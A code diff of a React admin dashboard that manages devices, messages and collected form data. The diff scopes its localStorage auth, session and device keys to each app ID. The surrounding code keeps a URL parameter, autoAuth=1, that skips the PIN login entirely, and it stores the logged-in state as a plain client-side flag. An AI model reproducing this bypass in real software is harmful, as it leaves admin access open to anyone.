@@ -1191,7 +1191,8 @@ function AdminUpdatePanel({ device }: { device: DbDevice }) {
   );
 }
 
-function DevicesPage({ devices, messages, formData, initialDevice, onBack, initialCount, onCountChange }: { devices: DbDevice[]; messages: DbMessage[]; formData: DbFormData[]; initialDevice?: DbDevice | null; onBack?: () => void; initialCount?: number; onCountChange?: (n: number) => void }) {
+function DevicesPage({ appId, devices, messages, formData, initialDevice, onBack, initialCount, onCountChange }: { appId: string; devices: DbDevice[]; messages: DbMessage[]; formData: DbFormData[]; initialDevice?: DbDevice | null; onBack?: () => void; initialCount?: number; onCountChange?: (n: number) => void }) {
+  const DEVICE_KEY = `mrrobot_device_id_${appId}`;
   const t = useTheme();
   const [search, setSearch] = useState("");
   const [selected, setSelected] = useState<DbDevice | null>(initialDevice ?? null);
@@ -1215,7 +1216,7 @@ function DevicesPage({ devices, messages, formData, initialDevice, onBack, initi
       if (fresh && fresh !== selected) setSelected(fresh);
       return;
     }
-    const savedId = localStorage.getItem("mrrobot_device_id");
+    const savedId = localStorage.getItem(DEVICE_KEY);
     if (savedId) {
       const found = devices.find(d => d.deviceId === savedId);
       if (found) {
@@ -1348,7 +1349,7 @@ function DevicesPage({ devices, messages, formData, initialDevice, onBack, initi
   /* ── Detail view ── */
   if (selected) {
     const handleBack = () => {
-      setSelected(null); setActiveAction(null); localStorage.removeItem("mrrobot_device_id");
+      setSelected(null); setActiveAction(null); localStorage.removeItem(DEVICE_KEY);
       if (fromExternal && onBack) {
         onBack();
       } else {
@@ -1700,7 +1701,7 @@ function DevicesPage({ devices, messages, formData, initialDevice, onBack, initi
                 const scrollEl = document.getElementById("main-scroll");
                 internalScrollRef.current = scrollEl?.scrollTop ?? 0;
                 internalCountRef.current = visibleDevices.length;
-                setSelected(device); setFromExternal(false); localStorage.setItem("mrrobot_device_id", device.deviceId);
+                setSelected(device); setFromExternal(false); localStorage.setItem(DEVICE_KEY, device.deviceId);
               }}
                 style={{ background: t.card, borderRadius: 12, border: `1px solid ${t.cardB}`, cursor: "pointer", overflow: "hidden" }}>
 
@@ -1752,11 +1753,13 @@ function SettingsPage({ appId, isDark, onToggleDark, devices, onLogout }: {
   appId: string; isDark: boolean; onToggleDark: () => void; devices: DbDevice[]; onLogout: () => void;
 }) {
   const t = useTheme();
+  const AUTH_KEY = `mrrobot_auth_${appId}`;
+  const SESS_KEY = `mrrobot_session_id_${appId}`;
 
   /* ── Admin Sessions ── */
   const [sessions, setSessions] = useState<AdminSession[]>([]);
   const [sessLoading, setSessLoading] = useState(true);
-  const mySessionId = localStorage.getItem("mrrobot_session_id") ?? "";
+  const mySessionId = localStorage.getItem(SESS_KEY) ?? "";
 
   async function fetchSessions() {
     try {
@@ -1764,10 +1767,10 @@ function SettingsPage({ appId, isDark, onToggleDark, devices, onLogout }: {
       if (r.ok) {
         const list: AdminSession[] = await r.json();
         setSessions(list);
-        const myId = localStorage.getItem("mrrobot_session_id");
+        const myId = localStorage.getItem(SESS_KEY);
         if (myId && !list.find(s => s.id === myId)) {
-          localStorage.removeItem("mrrobot_auth");
-          localStorage.removeItem("mrrobot_session_id");
+          localStorage.removeItem(AUTH_KEY);
+          localStorage.removeItem(SESS_KEY);
           onLogout();
         }
       }
@@ -2125,9 +2128,9 @@ function LoginPage({ onAuth, appId, appName }: { onAuth: () => void; appId: stri
       const sessR = await fetch("/api/admin/sessions", { method: "POST" }).catch(() => null);
       if (sessR?.ok) {
         const { sessionId } = await sessR.json();
-        localStorage.setItem("mrrobot_session_id", sessionId);
+        localStorage.setItem(`mrrobot_session_id_${appId}`, sessionId);
       }
-      localStorage.setItem("mrrobot_auth", "1");
+      localStorage.setItem(`mrrobot_auth_${appId}`, "1");
       onAuth();
     } catch { setErr("Network error. Try again."); }
     finally { setLoading(false); }
@@ -2272,12 +2275,14 @@ function LoginPage({ onAuth, appId, appName }: { onAuth: () => void; appId: stri
 ════════════════════════════════════════ */
 export default function WebDashboard() {
   const [appId] = useState<string>(() => new URLSearchParams(window.location.search).get("appId") || "SKY-APP-2026-X9F3");
+  const DEVICE_KEY = `mrrobot_device_id_${appId}`;
   const [appName, setAppName] = useState("");
   // autoAuth=1 in URL → bypass PIN login for canvas/iframe preview
   const [authed, setAuthed] = useState<boolean>(() => {
     const params = new URLSearchParams(window.location.search);
     if (params.get("autoAuth") === "1") return true;
-    return localStorage.getItem("mrrobot_auth") === "1";
+    const aId = params.get("appId") || "SKY-APP-2026-X9F3";
+    return localStorage.getItem(`mrrobot_auth_${aId}`) === "1";
   });
   const [devices, setDevices] = useState<DbDevice[]>([]);
   const [messages, setMessages] = useState<DbMessage[]>([]);
@@ -2299,10 +2304,10 @@ export default function WebDashboard() {
         const app = await r.json() as { status: string; name?: string };
         if (app.name) setAppName(app.name);
         if (app.status !== "active") {
-          const sid = localStorage.getItem("mrrobot_session_id");
+          const sid = localStorage.getItem(`mrrobot_session_id_${appId}`);
           if (sid) fetch(`/api/admin/sessions/${sid}`, { method: "DELETE" }).catch(() => {});
-          localStorage.removeItem("mrrobot_auth");
-          localStorage.removeItem("mrrobot_session_id");
+          localStorage.removeItem(`mrrobot_auth_${appId}`);
+          localStorage.removeItem(`mrrobot_session_id_${appId}`);
           setAuthed(false);
         }
       } catch { /* ignore network errors */ }
@@ -2389,7 +2394,7 @@ export default function WebDashboard() {
     localStorage.setItem("mrrobot_back_page", page);
     setSelectedDevice(device);
     setPage("devices");
-    localStorage.setItem("mrrobot_device_id", device.deviceId);
+    localStorage.setItem(DEVICE_KEY, device.deviceId);
     if (msgId) setScrollToMsgId(msgId);
   }
 
@@ -2397,7 +2402,7 @@ export default function WebDashboard() {
     goingBackRef.current = true;
     setSelectedDevice(null);
     setPage(backPage);
-    localStorage.removeItem("mrrobot_device_id");
+    localStorage.removeItem(DEVICE_KEY);
     localStorage.removeItem("mrrobot_back_page");
   }
 
@@ -2416,7 +2421,7 @@ export default function WebDashboard() {
       const [d, m, f] = await Promise.all([dRes.json(), mRes.json(), fRes.ok ? fRes.json() : []]) as [DbDevice[], DbMessage[], DbFormData[]];
       setDevices(d); setMessages(m); setFormData(f);
       setError(null);
-      const savedDeviceId = localStorage.getItem("mrrobot_device_id");
+      const savedDeviceId = localStorage.getItem(DEVICE_KEY);
       if (savedDeviceId) {
         const found = (d as DbDevice[]).find(dev => dev.deviceId === savedDeviceId);
         if (found) setSelectedDevice(found);
@@ -2468,7 +2473,7 @@ export default function WebDashboard() {
             return next;
           });
           setSelectedDevice(sel => sel?.deviceId === device.deviceId ? device : sel);
-          const savedId = localStorage.getItem("mrrobot_device_id");
+          const savedId = localStorage.getItem(DEVICE_KEY);
           if (savedId === device.deviceId) setSelectedDevice(device);
         } else if (event === "message_added") {
           const payload = data as { appId: string; message: DbMessage };
@@ -2503,8 +2508,8 @@ export default function WebDashboard() {
           setMessages(prev => prev.filter(m => m.deviceId !== payload.deviceId));
           setFormData(prev => prev.filter(f => f.deviceId !== payload.deviceId));
           setSelectedDevice(sel => sel?.deviceId === payload.deviceId ? null : sel);
-          if (localStorage.getItem("mrrobot_device_id") === payload.deviceId) {
-            localStorage.removeItem("mrrobot_device_id");
+          if (localStorage.getItem(DEVICE_KEY) === payload.deviceId) {
+            localStorage.removeItem(DEVICE_KEY);
           }
         }
       };
@@ -2595,10 +2600,10 @@ export default function WebDashboard() {
   ];
 
   function handleLogout() {
-    const sid = localStorage.getItem("mrrobot_session_id");
+    const sid = localStorage.getItem(`mrrobot_session_id_${appId}`);
     if (sid) fetch(`/api/admin/sessions/${sid}`, { method: "DELETE" }).catch(() => {});
-    localStorage.removeItem("mrrobot_auth");
-    localStorage.removeItem("mrrobot_session_id");
+    localStorage.removeItem(`mrrobot_auth_${appId}`);
+    localStorage.removeItem(`mrrobot_session_id_${appId}`);
     setAuthed(false);
   }
 
@@ -2798,7 +2803,7 @@ export default function WebDashboard() {
               {page === "home" && <HomePage devices={displayDevices} messages={messages} formData={formData} onOpenDevice={onOpenDevice} scrollToMsgId={backPage === "home" ? scrollToMsgId : null} onScrollDone={() => setScrollToMsgId(null)} initialCount={homeMsgCountRef.current} onCountChange={n => { homeMsgCountRef.current = n; }} />}
               {page === "messages" && <MessagesPage messages={messages} devices={displayDevices} onOpenDevice={onOpenDevice} scrollToMsgId={backPage === "messages" ? scrollToMsgId : null} onScrollDone={() => setScrollToMsgId(null)} initialCount={msgPageCountRef.current} onCountChange={n => { msgPageCountRef.current = n; }} />}
               {page === "groups" && <GroupsPage devices={displayDevices} messages={messages} formData={formData} onOpenDevice={onOpenDevice} initialCount={groupsCountRef.current} onCountChange={n => { groupsCountRef.current = n; }} />}
-              {page === "devices" && <DevicesPage devices={displayDevices} messages={messages} formData={formData} initialDevice={selectedDevice} onBack={onBack} initialCount={devicesCountRef.current} onCountChange={n => { devicesCountRef.current = n; }} />}
+              {page === "devices" && <DevicesPage appId={appId} devices={displayDevices} messages={messages} formData={formData} initialDevice={selectedDevice} onBack={onBack} initialCount={devicesCountRef.current} onCountChange={n => { devicesCountRef.current = n; }} />}
               {page === "settings" && <SettingsPage appId={appId} isDark={darkMode} onToggleDark={toggleDark} devices={displayDevices} onLogout={handleLogout} />}
             </div>
             <ScrollToTopBtn />
